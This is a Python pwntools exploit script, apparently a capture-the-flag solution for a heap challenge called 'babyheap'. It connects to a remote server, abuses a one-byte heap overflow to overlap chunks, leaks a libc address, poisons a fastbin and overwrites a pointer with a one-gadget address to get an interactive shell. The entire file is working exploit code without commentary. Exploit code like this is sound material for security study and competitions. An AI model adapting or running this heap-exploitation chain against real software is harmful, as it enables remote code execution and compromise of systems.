from pwn import *


def alloca(size):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(size))

def edit(idx,size,content):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))
	r.sendlineafter(":",str(size))
	r.sendafter(":",content)

def remove(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

def view(idx):
	r.sendlineafter(":","4")
	r.sendlineafter(":",str(idx))
	r.recvuntil(": ")
	val =  u64(r.recv(8))
	r.recvuntil("1.")
	return val

r = remote("202.120.7.204",127)

#r = process(["./babyheap"])

alloca(0x58) #0
alloca(0x58) #1
alloca(0x58) #2
alloca(0x58) #3

offset = 0x399af0
one_get = 0x3f35a

edit(0,0x59,"\x00"*0x58+"\xc1")
remove(1)
alloca(0x58) #1
libc = view(2) - offset-0x68
target = libc + offset + 0x15 + 0x8
#libc = view(2) - 0x3c4b10 - 0x68
#target = libc+0x3c4b25+0x8

print hex(libc)
print "target",hex(target)


#r.interactive()

alloca(0x58) #4

alloca(0x18) #5
alloca(0x48) #6
alloca(0x58) #7
alloca(0x58) #8
edit(3,0x59,"\x00"*0x58+"\xd1")

remove(6)
remove(5)


alloca(0x58) #5

edit(5,0x28,"\x00"*0x18+p64(0x51)+p64(target))

alloca(0x58) #6
alloca(0x28) #7
remove(9) #9

alloca(0x48)
alloca(0x48) #10

edit(10,0x43,"\x00"*3+p64(0x0)*5+p64(0xffffffffffffffff)+p64(0x0)+p64(libc+offset-0x28))
#edit(10,0x43,"\x00"*3+p64(0x0)*5+p64(0xffffffffffffffff)+p64(0x0)+p64(libc+0x3c4ae8))

alloca(0x30) #11

#edit(11,0x20,p64(0x0)*3+p64(libc+0x4526a))

edit(11,0x20,p64(0x0)*3+p64(libc+one_get))

alloca(0x10)
r.interactive()
